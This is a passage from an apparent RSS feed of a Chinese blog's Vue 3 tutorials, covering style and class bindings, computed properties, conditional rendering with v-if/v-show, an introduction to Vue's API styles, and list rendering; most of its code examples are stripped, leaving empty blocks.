<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>渲染出的 HTML 为：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Class 的绑定也是同样的：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>当 <code>isActive</code> 为真时，被渲染的 HTML 会是：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果你的组件有多个根元素，你将需要指定哪个根元素来接收这个 class。你可以通过组件的 <code>$attrs</code> 属性来实现指定：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这将被渲染为：</p>
<div class="language-html line-numbers-mode" data-ext="html"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>你可以在 <a href="">透传 Attribute</a> 中了解更多组件的 attribute 继承的细节。</p>
<h2> 绑定内联样式</h2>
<h3> 绑定对象</h3>
<p><code>:style</code> 支持绑定 JavaScript 对象值，对应的是 <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/style" target="_blank" rel="noopener noreferrer">HTML 元素的 <code>style</code> 属性</a>：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>尽管推荐使用 <code>camelCase</code>，但 <code>:style</code> 也支持 <code>kebab-cased</code> 形式的 CSS 属性 key（对应其 CSS 中的实际名称）。例如：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>直接绑定一个样式对象通常是一个好主意，这样可以使模板更加简洁：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>同样的，如果样式对象需要更复杂的逻辑，也可以使用返回样式对象的计算属性。</p>
<h3> 绑定数组</h3>
<p>给 <code>:style</code> 绑定一个包含多个样式对象的数组。这些对象会被合并后渲染到同一元素上：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> 自动前缀</h3>
<p>当你在 <code>:style</code> 中使用了需要 <a href="https://developer.mozilla.org/en-US/docs/Glossary/Vendor_Prefix" target="_blank" rel="noopener noreferrer">浏览器特殊前缀</a> 的 CSS 属性时，Vue 会自动为他们加上相应的前缀。Vue 是在运行时检查该属性是否支持在当前浏览器中使用。如果浏览器不支持某个属性，那么将尝试加上各个浏览器特殊前缀，以找到哪一个是被支持的。</p>
<h3> 样式多值</h3>
<p>你可以对一个样式属性提供多个（不同前缀的）值。例如：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>数组仅会渲染浏览器支持的最后一个值。在这个示例中，在支持不需要特别前缀的浏览器中都会渲染为 <code>display: flex</code>。</p>
]]></content:encoded>
    </item>
    <item>
      <title>计算属性</title>
      <link>https://sankgao.github.io/computers/framework/vue3/computed.html</link>
      <guid>https://sankgao.github.io/computers/framework/vue3/computed.html</guid>
      <source url="https://sankgao.github.io/rss.xml">计算属性</source>
      <description>基础示例 模板中的表达式虽然方便，但也只能用来做简单的操作。如果在模板中写太多逻辑，会让模板变得臃肿，难以维护。例如：有这样一个包含嵌套数组的对象： 根据 author 是否已有一些书籍来展示不同的信息： 这里的模板看起来有些复杂。必须认真看好一会儿才能明白它的计算依赖于 author.books。更重要的是，如果在模板中需要不止一次这样的计算，又不想...</description>
      <category>Frontend</category>
      <pubDate>Fri, 28 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 基础示例</h2>
<p>模板中的表达式虽然方便，但也只能用来做简单的操作。如果在模板中写太多逻辑，会让模板变得臃肿，难以维护。例如：有这样一个包含嵌套数组的对象：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>根据 <code>author</code> 是否已有一些书籍来展示不同的信息：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>这里的模板看起来有些复杂。必须认真看好一会儿才能明白它的计算依赖于 <code>author.books</code>。更重要的是，如果在模板中需要不止一次这样的计算，又不想将这样的代码在模板里重复好多遍。</p>
<p>因此推荐使用 <strong>计算属性</strong> 来描述依赖响应式状态的复杂逻辑。这是重构后的示例：</p>
<div class="language-vue line-numbers-mode" data-ext="vue"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="https://sfc.vuejs.org/#eyJBcHAudnVlIjoiPHNjcmlwdCBzZXR1cD5cbmltcG9ydCB7IHJlYWN0aXZlLCBjb21wdXRlZCB9IGZyb20gJ3Z1ZSdcblxuY29uc3QgYXV0aG9yID0gcmVhY3RpdmUoe1xuICBuYW1lOiAnSm9obiBEb2UnLFxuICBib29rczogW1xuICAgICdWdWUgMiAtIEFkdmFuY2VkIEd1aWRlJyxcbiAgICAnVnVlIDMgLSBCYXNpYyBHdWlkZScsXG4gICAgJ1Z1ZSA0IC0gVGhlIE15c3RlcnknXG4gIF1cbn0pXG5cbi8vIGEgY29tcHV0ZWQgcmVmXG5jb25zdCBwdWJsaXNoZWRCb29rc01lc3NhZ2UgPSBjb21wdXRlZCgoKSA9PiB7XG4gIHJldHVybiBhdXRob3IuYm9va3MubGVuZ3RoID4gMCA/ICdZZXMnIDogJ05vJ1xufSlcbjwvc2NyaXB0PlxuXG48dGVtcGxhdGU+XG4gIDxwPkhhcyBwdWJsaXNoZWQgYm9va3M6PC9wPlxuICA8c3Bhbj57eyBwdWJsaXNoZWRCb29rc01lc3NhZ2UgfX08L3NwYW4+XG48L3RlbXBsYXRlPiIsImltcG9ydC1tYXAuanNvbiI6IntcbiAgXCJpbXBvcnRzXCI6IHtcbiAgICBcInZ1ZVwiOiBcImh0dHBzOi8vc2ZjLnZ1ZWpzLm9yZy92dWUucnVudGltZS5lc20tYnJvd3Nlci5qc1wiXG4gIH1cbn0ifQ==" target="_blank" rel="noopener noreferrer">在演练场中尝试一下</a></p>
<p>在这里定义了一个计算属性 <code>publishedBooksMessage</code>。<code>computed()</code> 方法期望接收一个 <code>getter</code> 函数，返回值为一个 <strong>计算属性 ref</strong>。和其他一般的 ref 类似，通过 <code>publishedBooksMessage.value</code> 访问计算结果。计算属性 ref 也会在模板中自动解包，因此在模板表达式中引用时无需添加 <code>.value</code>。</p>
<p>Vue 的计算属性会自动追踪响应式依赖。它会检测到 <code>publishedBooksMessage</code> 依赖于 <code>author.books</code>，所以当 <code>author.books</code> 改变时，任何依赖于 <code>publishedBooksMessage</code> 的绑定都会同时更新。</p>
<p>也可参考：<a href="">为计算属性标注类型</a> <sup class="vt-badge ts"></sup></p>
<h2> 计算属性缓存 VS 方法</h2>
<p>在表达式中像这样调用一个函数也会获得和计算属性相同的结果：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>若将同样的函数定义为一个方法而不是计算属性，两种方式在结果上确实是完全相同的，然而，不同之处在于 <strong>计算属性值会基于其响应式依赖被缓存</strong>。一个计算属性仅会在其响应式依赖更新时才重新计算。这意味着只要 <code>author.books</code> 不改变，无论多少次访问 <code>publishedBooksMessage</code> 都会立即返回先前的计算结果，而不用重复执行 <code>getter</code> 函数。</p>
<p>这也解释了为什么下面的计算属性永远不会更新，因为 <code>Date.now()</code> 并不是一个响应式依赖：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>相比之下，方法调用 <strong>总是</strong> 会在重渲染发生时再次执行函数。</p>
<p>为什么需要缓存呢？想象一下如果有一个非常耗性能的计算属性 <code>list</code>，需要循环一个巨大的数组并做许多计算逻辑，并且可能也有其他计算属性依赖于 <code>list</code>。没有缓存的话，会重复执行非常多次 <code>list</code> 的 <code>getter</code>，然而这实际上没有必要！如果您确定不需要缓存，那么也可以使用方法调用。</p>
<h2> 可写计算属性</h2>
<p>计算属性默认是只读的。当您尝试修改一个计算属性时，您会收到一个运行时警告。只在某些特殊场景中您可能才需要用到 “可写” 的属性，您可以通过同时提供 <code>getter</code> 和 <code>setter</code> 来创建：</p>
<div class="language-vue line-numbers-mode" data-ext="vue"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>现在当您再运行 <code>fullName.value = 'John Doe'</code> 时，setter 会被调用而 <code>firstName</code> 和 <code>lastName</code> 会随之更新。</p>
<h2> 最佳实践</h2>
<h3> Getter 不应有副作用</h3>
<p>计算属性的 <code>getter</code> 应只做计算而没有任何其他的副作用，这一点非常重要，请务必牢记。举例来说，<strong>不要在 getter 中做异步请求或者更改 DOM</strong>！</p>
<p>一个计算属性的声明中描述的是如何根据其他值派生一个值。因此 <code>getter</code> 的职责应该仅为计算和返回该值。</p>
<h3> 避免直接修改计算属性值</h3>
<p>从计算属性返回的值是派生状态。可以把它看作是一个 “临时快照”，每当源状态发生变化时，就会创建一个新的快照。更改快照是没有意义的，因此计算属性的返回值应该被视为只读的，并且永远不应该被更改——应该更新它所依赖的源状态以触发新的计算。</p>
]]></content:encoded>
    </item>
    <item>
      <title>条件渲染</title>
      <link>https://sankgao.github.io/computers/framework/vue3/conditional.html</link>
      <guid>https://sankgao.github.io/computers/framework/vue3/conditional.html</guid>
      <source url="https://sankgao.github.io/rss.xml">条件渲染</source>
      <description>v-if v-if 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回真值时才被渲染。 v-else 您也可以使用 v-else 为 v-if 添加一个 “else 区块”。 在演练场中尝试一下 (https://play.vuejs.org/#eNpFjkEOgjAQRa8ydIMulLA1hegJ3LnqBskAjdA27RQXhHu4M...</description>
      <category>Frontend</category>
      <pubDate>Mon, 01 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> v-if</h2>
<p><code>v-if</code> 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回真值时才被渲染。</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2> v-else</h2>
<p>您也可以使用 <code>v-else</code> 为 <code>v-if</code> 添加一个 “else 区块”。</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="https://play.vuejs.org/#eNpFjkEOgjAQRa8ydIMulLA1hegJ3LnqBskAjdA27RQXhHu4M/GEHsEiKLv5mfdf/sBOxux7j+zAuCutNAQOyZtcKNkZbQkGsFjBCJXVHcQBjYUSqtTKERR3dLpDyCZmQ9bjViiezKKgCIGwM21BGBIAv3oireBYtrK8ZYKtgmg5BctJ13WLPJnhr0YQb1Lod7JaS4G8eATpfjMinjTphC8wtg7zcwNKw/v5eC1fnvwnsfEDwaha7w==" target="_blank" rel="noopener noreferrer">在演练场中尝试一下</a></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>一个 <code>v-else</code> 元素必须跟在一个 <code>v-if</code> 或者 <code>v-else-if</code> 元素后面，否则它将不会被识别</p>
</div>
<h2> v-else-if</h2>
<p>顾名思义，<code>v-else-if</code> 提供的是相应于 <code>v-if</code> 的 “else if 区块”。它可以连续多次重复使用：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>和 <code>v-else</code> 类似，一个使用 <code>v-else-if</code> 的元素必须紧跟在一个 <code>v-if</code> 或一个 <code>v-else-if</code> 元素后面。</p>
<h2> &lt;template&gt; 上的 v-if</h2>
<p>因为 <code>v-if</code> 是一个指令，他必须依附于某个元素。但如果想要切换不止一个元素呢？在这种情况下可以在一个 <code>&lt;template&gt;</code> 元素上使用 <code>v-if</code>，这只是一个不可见的包装器元素，最后渲染的结果并不会包含这个 <code>&lt;template&gt;</code> 元素。</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>v-else</code> 和 <code>v-else-if</code> 也可以在 <code>&lt;template&gt;</code> 上使用。</p>
<h2> v-show</h2>
<p>另一个可以用来按条件显示一个元素的指令是 <code>v-show</code>。其用法基本一样：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>不同之处在于 <code>v-show</code> 会在 DOM 渲染中保留该元素；<code>v-show</code> 仅切换了该元素上名为 <code>display</code> 的 CSS 属性。</p>
<p><code>v-show</code> 不支持在 <code>&lt;template&gt;</code> 元素上使用，也不能和 <code>v-else</code> 搭配使用。</p>
<h2> v-if VS v-show</h2>
<p><code>v-if</code> 是 “真实的” 按条件渲染，因为它确保了在切换时，条件区块内的事件监听器和子组件都会被销毁与重建。</p>
<p><code>v-if</code> 也是 <strong>惰性</strong> 的：如果在初次渲染时条件值为 false，则不会做任何事。条件区块只有当条件首次变为 true 时才被渲染。</p>
<p>相比之下，<code>v-show</code> 简单许多，元素无论初始条件如何，始终会被渲染，只有 CSS <code>display</code> 属性会被切换。</p>
<p>总的来说，<code>v-if</code> 有更高的切换开销，而 <code>v-show</code> 有更高的初始渲染开销。因此，如果需要频繁切换，则使用 <code>v-show</code> 较好；如果在运行时绑定条件很少改变，则 <code>v-if</code> 会更合适。</p>
<h2> v-if 和 v-for</h2>
<div class="hint-container warning">
<p class="hint-container-title">注意</p>
<p>同时使用 <code>v-if</code> 和 <code>v-for</code> 是 <strong>不推荐的</strong>，因为这样二者的优先级不明显。请查看 <a href="https://cn.vuejs.org/style-guide/rules-essential.html#avoid-v-if-with-v-for" target="_blank" rel="noopener noreferrer">风格指南</a> 获得更多信息。</p>
</div>
<p>当 <code>v-if</code> 和 <code>v-for</code> 同时存在于一个元素上的时候，<code>v-if</code> 会首先被执行。请查看 <a href="list#v-for-with-v-if">列表渲染指南</a> 获取更多细节。</p>
]]></content:encoded>
    </item>
    <item>
      <title>简介</title>
      <link>https://sankgao.github.io/computers/framework/vue3/introduction.html</link>
      <guid>https://sankgao.github.io/computers/framework/vue3/introduction.html</guid>
      <source url="https://sankgao.github.io/rss.xml">简介</source>
      <description>什么是 Vue Vue（发音为 /vjuː/，类似 view）是一款用于构建用户界面的 JavaScript 框架。它基于标准 HTML、`CSS 和 JavaScript 构建，并提供了一套 声明式的、组件化的 编程模型，可以帮助您高效地开发用户界面。无论是简单还是复杂的界面，Vue 都可以胜任。 下面是一个最基本的示例： 结果展示 import {...</description>
      <category>Frontend</category>
      <pubDate>Fri, 28 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 什么是 Vue</h2>
<p>Vue（发音为 <code>/vjuː/</code>，类似 view）是一款用于构建用户界面的 JavaScript 框架。它基于标准 <code>HTML</code>、<code>CSS</code> 和 <code>JavaScript</code> 构建，并提供了一套 <strong>声明式的</strong>、<strong>组件化的</strong> 编程模型，可以帮助您高效地开发用户界面。无论是简单还是复杂的界面，Vue 都可以胜任。</p>
<p>下面是一个最基本的示例：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>结果展示</strong></p>
<div class="demo">
  <button @click="count++">
    Count is: {{ count }}
  </button>
</div>
<p>上面的示例展示了 Vue 的两个 <strong>核心功能：</strong></p>
<ul>
<li><strong>声明式渲染</strong>：Vue 基于标准 HTML 拓展了一套模板语法，可以声明式地描述最终输出的 HTML 和 JavaScript 状态之间的关系</li>
<li><strong>响应性</strong>：Vue 会自动跟踪 JavaScript 状态并在其发生变化时响应式地更新 DOM</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">预备知识</p>
<p>接下来的内容会假设您对 <code>HTML</code>、<code>CSS</code> 和 <code>JavaScript</code> 已经基本熟悉。如果您对前端开发完全陌生，最好不要直接从一个框架开始进行入门学习——最好是掌握了基础知识再回到这里。您可以通过这篇 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/A_re-introduction_to_JavaScript" target="_blank" rel="noopener noreferrer">JavaScript 概述</a> 来检验您的 <code>JavaScript</code> 知识水平。如果之前有其他框架的经验会很有帮助，但也不是必须的。</p>
</div>
<h2> 渐进式框架​</h2>
<p>Vue 是一个 <strong>框架</strong>，也是一个 <strong>生态</strong>。其功能覆盖了大部分前端开发常见的需求。但 Web 世界是十分多样化的，不同的开发者在 Web 上构建的东西可能在形式和规模上会有很大的不同。考虑到这一点，Vue 的设计非常注重 <strong>灵活性</strong> 和 <strong>可以被逐步集成</strong> 这个特点。根据您的需求场景，您可以用不同的方式使用 Vue：</p>
<ul>
<li>无需构建步骤，渐进式增强静态的 HTML</li>
<li>在任何页面中作为 <code>Web Components</code> 嵌入</li>
<li>单页应用（SPA）</li>
<li>全栈/服务端渲染（SSR）</li>
<li>Jamstack/静态站点生成（SSG）</li>
<li>开发桌面端、移动端、WebGL，甚至是命令行终端中的界面</li>
</ul>
<p>如果您是初学者，可能会觉得这些概念有些复杂。别担心！以下的内容只需要具备基础的 HTML 和 JavaScript 知识。即使您不是这些方面的专家，也能够跟得上。</p>
<p>如果您是有经验的开发者，希望了解如何以最合适的方式在项目中引入 Vue，或者是对上述的这些概念感到好奇，在 <a href="/computers/framework/vue3/ways_of_using_vue.html" target="blank">使用 Vue 的多种方式</a> 中讨论了有关它们的更多细节。</p>
<p>无论再怎么灵活，Vue 的核心知识在所有这些用例中都是通用的。即使您现在只是一个初学者，随着您的不断成长，到未来有能力实现更复杂的项目时，这一路上获得的知识依然会适用。如果您已经是一个老手，您可以根据实际场景来选择使用 Vue 的最佳方式，在各种场景下都可以保持同样的开发效率。这就是为什么将 Vue 称为 <strong>渐进式框架</strong>：它是一个可以与您共同成长、适应您不同需求的框架。</p>
<h2> 单文件组件​</h2>
<p>在大多数启用了构建工具的 Vue 项目中，可以使用一种类似 HTML 格式的文件来书写 Vue 组件，它被称为 <strong>单文件组件</strong>（也被称为 <code>*.vue</code> 文件，英文 Single-File Components，缩写为 <code>SFC</code>）。顾名思义，Vue 的单文件组件会将一个组件的逻辑（JavaScript），模板（HTML）和样式（CSS）封装在同一个文件里。</p>
<p>下面将用 <strong>单文件组件</strong> 的格式重写上面的计数器示例：</p>
<div class="language-vue line-numbers-mode" data-ext="vue"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>单文件组件是 Vue 的标志性功能。如果您的用例需要进行 <strong>构建</strong>，则推荐用它来编写 Vue 组件。您可以在后续 <a href="">单文件组件的用法及用途</a> 中了解更多。但您暂时只需要知道 Vue 会帮忙处理所有这些构建工具的配置就好。</p>
<h2> API 风格​</h2>
<p>Vue 的组件可以按两种不同的风格书写：<strong>选项式 API</strong> 和 <strong>组合式 API。</strong></p>
<h3> 选项式 API（Options API）</h3>
<p>选项式 API 可以用包含多个选项的对象来描述组件的逻辑，例如：<code>data</code>、<code>methods</code> 和 <code>mounted</code>。选项所定义的属性都会暴露在函数内部的 <code>this</code> 上，它会指向当前的组件实例。</p>
<div class="language-vue line-numbers-mode" data-ext="vue"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="https://sfc.vuejs.org/#eyJBcHAudnVlIjoiPHNjcmlwdD5cbmV4cG9ydCBkZWZhdWx0IHtcbiAgLy8gcmVhY3RpdmUgc3RhdGVcbiAgZGF0YSgpIHtcbiAgICByZXR1cm4ge1xuICAgICAgY291bnQ6IDBcbiAgICB9XG4gIH0sXG5cbiAgLy8gZnVuY3Rpb25zIHRoYXQgbXV0YXRlIHN0YXRlIGFuZCB0cmlnZ2VyIHVwZGF0ZXNcbiAgbWV0aG9kczoge1xuICAgIGluY3JlbWVudCgpIHtcbiAgICAgIHRoaXMuY291bnQrK1xuICAgIH1cbiAgfSxcblxuICAvLyBsaWZlY3ljbGUgaG9va3NcbiAgbW91bnRlZCgpIHtcbiAgICBjb25zb2xlLmxvZyhgVGhlIGluaXRpYWwgY291bnQgaXMgJHt0aGlzLmNvdW50fS5gKVxuICB9XG59XG48L3NjcmlwdD5cblxuPHRlbXBsYXRlPlxuICA8YnV0dG9uIEBjbGljaz1cImluY3JlbWVudFwiPkNvdW50IGlzOiB7eyBjb3VudCB9fTwvYnV0dG9uPlxuPC90ZW1wbGF0ZT4ifQ==" target="_blank" rel="noopener noreferrer">在演练场中尝试一下</a></p>
<h3> 组合式 API（Composition API）</h3>
<p>组合式 API 可以使用导入的 <strong>API 函数</strong> 来描述组件逻辑。在单文件组件中，组合式 API 通常会与 <code>&lt;script setup&gt;</code> 搭配使用。这个 <code>setup</code> 属性是一个标识，告诉 Vue 需要在编译时进行一些处理，可以更简洁地使用组合式 API。比如：<code>&lt;script setup&gt;</code> 中的导入和顶层变量/函数都能够在模板中直接使用。</p>
<p>下面是使用了组合式 API 与 <code>&lt;script setup&gt;</code> 改造后和上面的模板完全一样的组件：</p>
<div class="language-vue line-numbers-mode" data-ext="vue"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="https://sfc.vuejs.org/#eyJBcHAudnVlIjoiPHNjcmlwdCBzZXR1cD5cbmltcG9ydCB7IHJlZiwgb25Nb3VudGVkIH0gZnJvbSAndnVlJ1xuXG4vLyByZWFjdGl2ZSBzdGF0ZVxuY29uc3QgY291bnQgPSByZWYoMClcblxuLy8gZnVuY3Rpb25zIHRoYXQgbXV0YXRlIHN0YXRlIGFuZCB0cmlnZ2VyIHVwZGF0ZXNcbmZ1bmN0aW9uIGluY3JlbWVudCgpIHtcbiAgY291bnQudmFsdWUrK1xufVxuXG4vLyBsaWZlY3ljbGUgaG9va3Ncbm9uTW91bnRlZCgoKSA9PiB7XG4gIGNvbnNvbGUubG9nKGBUaGUgaW5pdGlhbCBjb3VudCBpcyAke2NvdW50LnZhbHVlfS5gKVxufSlcbjwvc2NyaXB0PlxuXG48dGVtcGxhdGU+XG4gIDxidXR0b24gQGNsaWNrPVwiaW5jcmVtZW50XCI+Q291bnQgaXM6IHt7IGNvdW50IH19PC9idXR0b24+XG48L3RlbXBsYXRlPiJ9" target="_blank" rel="noopener noreferrer">在演练场中尝试一下</a></p>
<h2> 该选哪一个</h2>
<p>两种 API 风格都能够覆盖大部分的应用场景。它们只是 <strong>同一个底层系统</strong> 所提供的 <strong>两套不同的接口</strong>。实际上，选项式 API 是在组合式 API 的 <strong>基础上</strong> 实现的！关于 Vue 的基础概念和知识在它们之间都是通用的。</p>
<p>选项式 API 以 <strong>组件实例</strong> 的概念为中心（即上述例子中的 <code>this</code>），对于有面向对象语言背景的用户来说，这通常与基于类的心智模型更为一致。同时，它将响应性相关的细节抽象出来，并强制按照选项来组织代码，从而对初学者而言更为友好。</p>
<p>组合式 API 的核心思想是直接在 <strong>函数作用域内</strong> 定义响应式状态变量，并将从多个函数中得到的状态组合起来处理复杂问题。这种形式更加自由，也需要您对 Vue 的响应式系统有更深的理解才能高效使用。相应的，它的灵活性也使得组织和重用逻辑的模式变得更加强大。</p>
<p>在 <a href="">组合式 API FAQ</a> 中，您可以了解更多关于这两种 API 风格的对比以及组合式 API 所带来的潜在收益。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>如果您是使用 Vue 的新手，这里是我的大致建议：</p>
<ul>
<li>
<p>在学习的过程中，推荐采用更易于自己理解的风格。再强调一下，大部分的核心概念在这两种风格之间都是通用的。熟悉了一种风格以后，您也能够很快地理解另一种风格。</p>
</li>
<li>
<p>在生产项目中：</p>
<ul>
<li>当您不需要使用构建工具，或者打算主要在低复杂度的场景中使用 Vue，例如：渐进增强的应用场景，推荐采用选项式 API</li>
<li>当您打算用 Vue 构建完整的单页应用，推荐采用组合式 API + 单文件组件</li>
</ul>
</li>
</ul>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>列表渲染</title>
      <link>https://sankgao.github.io/computers/framework/vue3/list.html</link>
      <guid>https://sankgao.github.io/computers/framework/vue3/list.html</guid>
      <source url="https://sankgao.github.io/rss.xml">列表渲染</source>
      <description>v-for 可以使用 v-for 指令基于一个数组来渲染一个列表。v-for 指令的值需要使用 item in items 形式的特殊语法，其中 items 是源数据的数组，而 item 是迭代项的 别名： 在 v-for 块中可以完整地访问父作用域内的属性和变量。v-for 也支持使用可选的第二个参数表示当前项的位置索引。 const parentM...</description>
      <category>Frontend</category>
      <pubDate>Mon, 01 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> v-for</h2>
<p>可以使用 <code>v-for</code> 指令基于一个数组来渲染一个列表。<code>v-for</code> 指令的值需要使用 <code>item in items</code> 形式的特殊语法，其中 <code>items</code> 是源数据的数组，而 <code>item</code> 是迭代项的 <strong>别名</strong>：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在 <code>v-for</code> 块中可以完整地访问父作用域内的属性和变量。<code>v-for</code> 也支持使用可选的第二个参数表示当前项的位置索引。</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="demo">
  <li v-for="(item, index) in items">
    {{ parentMessage }} - {{ index }} - {{ item.message }}
  </li>
</div>
